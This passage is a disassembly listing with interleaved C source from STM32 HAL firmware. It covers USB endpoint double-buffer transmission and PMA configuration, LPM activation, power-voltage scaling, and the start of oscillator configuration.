 80034fc:	621a      	str	r2, [r3, #32]
 80034fe:	e017      	b.n	8003530 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 8003500:	68bb      	ldr	r3, [r7, #8]
 8003502:	6a1b      	ldr	r3, [r3, #32]
 8003504:	2b00      	cmp	r3, #0
 8003506:	d108      	bne.n	800351a <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003508:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800350c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003510:	68bb      	ldr	r3, [r7, #8]
 8003512:	2200      	movs	r2, #0
 8003514:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003518:	e00a      	b.n	8003530 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 800351a:	68bb      	ldr	r3, [r7, #8]
 800351c:	6a1b      	ldr	r3, [r3, #32]
 800351e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003522:	68bb      	ldr	r3, [r7, #8]
 8003524:	2200      	movs	r2, #0
 8003526:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003528:	68bb      	ldr	r3, [r7, #8]
 800352a:	2200      	movs	r2, #0
 800352c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003530:	68fb      	ldr	r3, [r7, #12]
 8003532:	681b      	ldr	r3, [r3, #0]
 8003534:	657b      	str	r3, [r7, #84]	; 0x54
 8003536:	68bb      	ldr	r3, [r7, #8]
 8003538:	785b      	ldrb	r3, [r3, #1]
 800353a:	2b00      	cmp	r3, #0
 800353c:	d165      	bne.n	800360a <HAL_PCD_EP_DB_Transmit+0x748>
 800353e:	68fb      	ldr	r3, [r7, #12]
 8003540:	681b      	ldr	r3, [r3, #0]
 8003542:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003544:	68fb      	ldr	r3, [r7, #12]
 8003546:	681b      	ldr	r3, [r3, #0]
 8003548:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800354c:	b29b      	uxth	r3, r3
 800354e:	461a      	mov	r2, r3
 8003550:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003552:	4413      	add	r3, r2
 8003554:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003556:	68bb      	ldr	r3, [r7, #8]
 8003558:	781b      	ldrb	r3, [r3, #0]
 800355a:	00da      	lsls	r2, r3, #3
 800355c:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800355e:	4413      	add	r3, r2
 8003560:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003564:	65bb      	str	r3, [r7, #88]	; 0x58
 8003566:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003568:	881b      	ldrh	r3, [r3, #0]
 800356a:	b29b      	uxth	r3, r3
 800356c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003570:	b29a      	uxth	r2, r3
 8003572:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003574:	801a      	strh	r2, [r3, #0]
 8003576:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800357a:	2b3e      	cmp	r3, #62	; 0x3e
 800357c:	d91d      	bls.n	80035ba <HAL_PCD_EP_DB_Transmit+0x6f8>
 800357e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003582:	095b      	lsrs	r3, r3, #5
 8003584:	66bb      	str	r3, [r7, #104]	; 0x68
 8003586:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800358a:	f003 031f 	and.w	r3, r3, #31
 800358e:	2b00      	cmp	r3, #0
 8003590:	d102      	bne.n	8003598 <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003592:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003594:	3b01      	subs	r3, #1
 8003596:	66bb      	str	r3, [r7, #104]	; 0x68
 8003598:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800359a:	881b      	ldrh	r3, [r3, #0]
 800359c:	b29a      	uxth	r2, r3
 800359e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035a0:	b29b      	uxth	r3, r3
 80035a2:	029b      	lsls	r3, r3, #10
 80035a4:	b29b      	uxth	r3, r3
 80035a6:	4313      	orrs	r3, r2
 80035a8:	b29b      	uxth	r3, r3
 80035aa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035ae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035b2:	b29a      	uxth	r2, r3
 80035b4:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035b6:	801a      	strh	r2, [r3, #0]
 80035b8:	e041      	b.n	800363e <HAL_PCD_EP_DB_Transmit+0x77c>
 80035ba:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035be:	2b00      	cmp	r3, #0
 80035c0:	d10a      	bne.n	80035d8 <HAL_PCD_EP_DB_Transmit+0x716>
 80035c2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035c4:	881b      	ldrh	r3, [r3, #0]
 80035c6:	b29b      	uxth	r3, r3
 80035c8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035cc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035d0:	b29a      	uxth	r2, r3
 80035d2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035d4:	801a      	strh	r2, [r3, #0]
 80035d6:	e032      	b.n	800363e <HAL_PCD_EP_DB_Transmit+0x77c>
 80035d8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035dc:	085b      	lsrs	r3, r3, #1
 80035de:	66bb      	str	r3, [r7, #104]	; 0x68
 80035e0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035e4:	f003 0301 	and.w	r3, r3, #1
 80035e8:	2b00      	cmp	r3, #0
 80035ea:	d002      	beq.n	80035f2 <HAL_PCD_EP_DB_Transmit+0x730>
 80035ec:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035ee:	3301      	adds	r3, #1
 80035f0:	66bb      	str	r3, [r7, #104]	; 0x68
 80035f2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035f4:	881b      	ldrh	r3, [r3, #0]
 80035f6:	b29a      	uxth	r2, r3
 80035f8:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035fa:	b29b      	uxth	r3, r3
 80035fc:	029b      	lsls	r3, r3, #10
 80035fe:	b29b      	uxth	r3, r3
 8003600:	4313      	orrs	r3, r2
 8003602:	b29a      	uxth	r2, r3
 8003604:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003606:	801a      	strh	r2, [r3, #0]
 8003608:	e019      	b.n	800363e <HAL_PCD_EP_DB_Transmit+0x77c>
 800360a:	68bb      	ldr	r3, [r7, #8]
 800360c:	785b      	ldrb	r3, [r3, #1]
 800360e:	2b01      	cmp	r3, #1
 8003610:	d115      	bne.n	800363e <HAL_PCD_EP_DB_Transmit+0x77c>
 8003612:	68fb      	ldr	r3, [r7, #12]
 8003614:	681b      	ldr	r3, [r3, #0]
 8003616:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800361a:	b29b      	uxth	r3, r3
 800361c:	461a      	mov	r2, r3
 800361e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003620:	4413      	add	r3, r2
 8003622:	657b      	str	r3, [r7, #84]	; 0x54
 8003624:	68bb      	ldr	r3, [r7, #8]
 8003626:	781b      	ldrb	r3, [r3, #0]
 8003628:	00da      	lsls	r2, r3, #3
 800362a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800362c:	4413      	add	r3, r2
 800362e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003632:	653b      	str	r3, [r7, #80]	; 0x50
 8003634:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003638:	b29a      	uxth	r2, r3
 800363a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800363c:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 800363e:	68fb      	ldr	r3, [r7, #12]
 8003640:	6818      	ldr	r0, [r3, #0]
 8003642:	68bb      	ldr	r3, [r7, #8]
 8003644:	6959      	ldr	r1, [r3, #20]
 8003646:	68bb      	ldr	r3, [r7, #8]
 8003648:	895a      	ldrh	r2, [r3, #10]
 800364a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800364e:	b29b      	uxth	r3, r3
 8003650:	f004 fee7 	bl	8008422 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003654:	68fb      	ldr	r3, [r7, #12]
 8003656:	681b      	ldr	r3, [r3, #0]
 8003658:	461a      	mov	r2, r3
 800365a:	68bb      	ldr	r3, [r7, #8]
 800365c:	781b      	ldrb	r3, [r3, #0]
 800365e:	009b      	lsls	r3, r3, #2
 8003660:	4413      	add	r3, r2
 8003662:	881b      	ldrh	r3, [r3, #0]
 8003664:	b29b      	uxth	r3, r3
 8003666:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800366a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800366e:	82bb      	strh	r3, [r7, #20]
 8003670:	8abb      	ldrh	r3, [r7, #20]
 8003672:	f083 0310 	eor.w	r3, r3, #16
 8003676:	82bb      	strh	r3, [r7, #20]
 8003678:	8abb      	ldrh	r3, [r7, #20]
 800367a:	f083 0320 	eor.w	r3, r3, #32
 800367e:	82bb      	strh	r3, [r7, #20]
 8003680:	68fb      	ldr	r3, [r7, #12]
 8003682:	681b      	ldr	r3, [r3, #0]
 8003684:	461a      	mov	r2, r3
 8003686:	68bb      	ldr	r3, [r7, #8]
 8003688:	781b      	ldrb	r3, [r3, #0]
 800368a:	009b      	lsls	r3, r3, #2
 800368c:	441a      	add	r2, r3
 800368e:	8abb      	ldrh	r3, [r7, #20]
 8003690:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003694:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003698:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800369c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80036a0:	b29b      	uxth	r3, r3
 80036a2:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 80036a4:	2300      	movs	r3, #0
}
 80036a6:	4618      	mov	r0, r3
 80036a8:	3790      	adds	r7, #144	; 0x90
 80036aa:	46bd      	mov	sp, r7
 80036ac:	bd80      	pop	{r7, pc}

080036ae <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 80036ae:	b480      	push	{r7}
 80036b0:	b087      	sub	sp, #28
 80036b2:	af00      	add	r7, sp, #0
 80036b4:	60f8      	str	r0, [r7, #12]
 80036b6:	607b      	str	r3, [r7, #4]
 80036b8:	460b      	mov	r3, r1
 80036ba:	817b      	strh	r3, [r7, #10]
 80036bc:	4613      	mov	r3, r2
 80036be:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80036c0:	897b      	ldrh	r3, [r7, #10]
 80036c2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80036c6:	b29b      	uxth	r3, r3
 80036c8:	2b00      	cmp	r3, #0
 80036ca:	d00b      	beq.n	80036e4 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80036cc:	897b      	ldrh	r3, [r7, #10]
 80036ce:	f003 0307 	and.w	r3, r3, #7
 80036d2:	1c5a      	adds	r2, r3, #1
 80036d4:	4613      	mov	r3, r2
 80036d6:	009b      	lsls	r3, r3, #2
 80036d8:	4413      	add	r3, r2
 80036da:	00db      	lsls	r3, r3, #3
 80036dc:	68fa      	ldr	r2, [r7, #12]
 80036de:	4413      	add	r3, r2
 80036e0:	617b      	str	r3, [r7, #20]
 80036e2:	e009      	b.n	80036f8 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80036e4:	897a      	ldrh	r2, [r7, #10]
 80036e6:	4613      	mov	r3, r2
 80036e8:	009b      	lsls	r3, r3, #2
 80036ea:	4413      	add	r3, r2
 80036ec:	00db      	lsls	r3, r3, #3
 80036ee:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80036f2:	68fa      	ldr	r2, [r7, #12]
 80036f4:	4413      	add	r3, r2
 80036f6:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 80036f8:	893b      	ldrh	r3, [r7, #8]
 80036fa:	2b00      	cmp	r3, #0
 80036fc:	d107      	bne.n	800370e <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 80036fe:	697b      	ldr	r3, [r7, #20]
 8003700:	2200      	movs	r2, #0
 8003702:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003704:	687b      	ldr	r3, [r7, #4]
 8003706:	b29a      	uxth	r2, r3
 8003708:	697b      	ldr	r3, [r7, #20]
 800370a:	80da      	strh	r2, [r3, #6]
 800370c:	e00b      	b.n	8003726 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800370e:	697b      	ldr	r3, [r7, #20]
 8003710:	2201      	movs	r2, #1
 8003712:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003714:	687b      	ldr	r3, [r7, #4]
 8003716:	b29a      	uxth	r2, r3
 8003718:	697b      	ldr	r3, [r7, #20]
 800371a:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 800371c:	687b      	ldr	r3, [r7, #4]
 800371e:	0c1b      	lsrs	r3, r3, #16
 8003720:	b29a      	uxth	r2, r3
 8003722:	697b      	ldr	r3, [r7, #20]
 8003724:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8003726:	2300      	movs	r3, #0
}
 8003728:	4618      	mov	r0, r3
 800372a:	371c      	adds	r7, #28
 800372c:	46bd      	mov	sp, r7
 800372e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003732:	4770      	bx	lr

08003734 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 8003734:	b480      	push	{r7}
 8003736:	b085      	sub	sp, #20
 8003738:	af00      	add	r7, sp, #0
 800373a:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 800373c:	687b      	ldr	r3, [r7, #4]
 800373e:	681b      	ldr	r3, [r3, #0]
 8003740:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 8003742:	687b      	ldr	r3, [r7, #4]
 8003744:	2201      	movs	r2, #1
 8003746:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 800374a:	687b      	ldr	r3, [r7, #4]
 800374c:	2200      	movs	r2, #0
 800374e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 8003752:	68fb      	ldr	r3, [r7, #12]
 8003754:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003758:	b29b      	uxth	r3, r3
 800375a:	f043 0301 	orr.w	r3, r3, #1
 800375e:	b29a      	uxth	r2, r3
 8003760:	68fb      	ldr	r3, [r7, #12]
 8003762:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 8003766:	68fb      	ldr	r3, [r7, #12]
 8003768:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800376c:	b29b      	uxth	r3, r3
 800376e:	f043 0302 	orr.w	r3, r3, #2
 8003772:	b29a      	uxth	r2, r3
 8003774:	68fb      	ldr	r3, [r7, #12]
 8003776:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 800377a:	2300      	movs	r3, #0
}
 800377c:	4618      	mov	r0, r3
 800377e:	3714      	adds	r7, #20
 8003780:	46bd      	mov	sp, r7
 8003782:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003786:	4770      	bx	lr

08003788 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 8003788:	b480      	push	{r7}
 800378a:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 800378c:	4b05      	ldr	r3, [pc, #20]	; (80037a4 <HAL_PWR_EnableBkUpAccess+0x1c>)
 800378e:	681b      	ldr	r3, [r3, #0]
 8003790:	4a04      	ldr	r2, [pc, #16]	; (80037a4 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003792:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003796:	6013      	str	r3, [r2, #0]
}
 8003798:	bf00      	nop
 800379a:	46bd      	mov	sp, r7
 800379c:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037a0:	4770      	bx	lr
 80037a2:	bf00      	nop
 80037a4:	40007000 	.word	0x40007000

080037a8 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 80037a8:	b480      	push	{r7}
 80037aa:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 80037ac:	4b04      	ldr	r3, [pc, #16]	; (80037c0 <HAL_PWREx_GetVoltageRange+0x18>)
 80037ae:	681b      	ldr	r3, [r3, #0]
 80037b0:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 80037b4:	4618      	mov	r0, r3
 80037b6:	46bd      	mov	sp, r7
 80037b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037bc:	4770      	bx	lr
 80037be:	bf00      	nop
 80037c0:	40007000 	.word	0x40007000

080037c4 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80037c4:	b480      	push	{r7}
 80037c6:	b085      	sub	sp, #20
 80037c8:	af00      	add	r7, sp, #0
 80037ca:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80037cc:	687b      	ldr	r3, [r7, #4]
 80037ce:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037d2:	d130      	bne.n	8003836 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80037d4:	4b23      	ldr	r3, [pc, #140]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037d6:	681b      	ldr	r3, [r3, #0]
 80037d8:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80037dc:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037e0:	d038      	beq.n	8003854 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 80037e2:	4b20      	ldr	r3, [pc, #128]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037e4:	681b      	ldr	r3, [r3, #0]
 80037e6:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80037ea:	4a1e      	ldr	r2, [pc, #120]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037ec:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80037f0:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 80037f2:	4b1d      	ldr	r3, [pc, #116]	; (8003868 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 80037f4:	681b      	ldr	r3, [r3, #0]
 80037f6:	2232      	movs	r2, #50	; 0x32
 80037f8:	fb02 f303 	mul.w	r3, r2, r3
 80037fc:	4a1b      	ldr	r2, [pc, #108]	; (800386c <HAL_PWREx_ControlVoltageScaling+0xa8>)
 80037fe:	fba2 2303 	umull	r2, r3, r2, r3
 8003802:	0c9b      	lsrs	r3, r3, #18
 8003804:	3301      	adds	r3, #1
 8003806:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003808:	e002      	b.n	8003810 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 800380a:	68fb      	ldr	r3, [r7, #12]
 800380c:	3b01      	subs	r3, #1
 800380e:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003810:	4b14      	ldr	r3, [pc, #80]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003812:	695b      	ldr	r3, [r3, #20]
 8003814:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003818:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800381c:	d102      	bne.n	8003824 <HAL_PWREx_ControlVoltageScaling+0x60>
 800381e:	68fb      	ldr	r3, [r7, #12]
 8003820:	2b00      	cmp	r3, #0
 8003822:	d1f2      	bne.n	800380a <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003824:	4b0f      	ldr	r3, [pc, #60]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003826:	695b      	ldr	r3, [r3, #20]
 8003828:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800382c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003830:	d110      	bne.n	8003854 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003832:	2303      	movs	r3, #3
 8003834:	e00f      	b.n	8003856 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003836:	4b0b      	ldr	r3, [pc, #44]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003838:	681b      	ldr	r3, [r3, #0]
 800383a:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 800383e:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003842:	d007      	beq.n	8003854 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003844:	4b07      	ldr	r3, [pc, #28]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003846:	681b      	ldr	r3, [r3, #0]
 8003848:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 800384c:	4a05      	ldr	r2, [pc, #20]	; (8003864 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800384e:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003852:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003854:	2300      	movs	r3, #0
}
 8003856:	4618      	mov	r0, r3
 8003858:	3714      	adds	r7, #20
 800385a:	46bd      	mov	sp, r7
 800385c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003860:	4770      	bx	lr
 8003862:	bf00      	nop
 8003864:	40007000 	.word	0x40007000
 8003868:	20000000 	.word	0x20000000
 800386c:	431bde83 	.word	0x431bde83

08003870 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003870:	b480      	push	{r7}
 8003872:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003874:	4b05      	ldr	r3, [pc, #20]	; (800388c <HAL_PWREx_EnableVddUSB+0x1c>)
 8003876:	685b      	ldr	r3, [r3, #4]
 8003878:	4a04      	ldr	r2, [pc, #16]	; (800388c <HAL_PWREx_EnableVddUSB+0x1c>)
 800387a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800387e:	6053      	str	r3, [r2, #4]
}
 8003880:	bf00      	nop
 8003882:	46bd      	mov	sp, r7
 8003884:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003888:	4770      	bx	lr
 800388a:	bf00      	nop
 800388c:	40007000 	.word	0x40007000

08003890 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 8003890:	b580      	push	{r7, lr}
 8003892:	b088      	sub	sp, #32
 8003894:	af00      	add	r7, sp, #0
 8003896:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003898:	687b      	ldr	r3, [r7, #4]
 800389a:	2b00      	cmp	r3, #0
 800389c:	d102      	bne.n	80038a4 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 800389e:	2301      	movs	r3, #1
 80038a0:	f000 bc02 	b.w	80040a8 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80038a4:	4b96      	ldr	r3, [pc, #600]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80038a6:	689b      	ldr	r3, [r3, #8]
 80038a8:	f003 030c 	and.w	r3, r3, #12
 80038ac:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 80038ae:	4b94      	ldr	r3, [pc, #592]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80038b0:	68db      	ldr	r3, [r3, #12]
 80038b2:	f003 0303 	and.w	r3, r3, #3
 80038b6:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 80038b8:	687b      	ldr	r3, [r7, #4]
 80038ba:	681b      	ldr	r3, [r3, #0]
 80038bc:	f003 0310 	and.w	r3, r3, #16
 80038c0:	2b00      	cmp	r3, #0
 80038c2:	f000 80e4 	beq.w	8003a8e <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 80038c6:	69bb      	ldr	r3, [r7, #24]
 80038c8:	2b00      	cmp	r3, #0
 80038ca:	d007      	beq.n	80038dc <HAL_RCC_OscConfig+0x4c>
 80038cc:	69bb      	ldr	r3, [r7, #24]
 80038ce:	2b0c      	cmp	r3, #12
 80038d0:	f040 808b 	bne.w	80039ea <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 80038d4:	697b      	ldr	r3, [r7, #20]
 80038d6:	2b01      	cmp	r3, #1
 80038d8:	f040 8087 	bne.w	80039ea <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
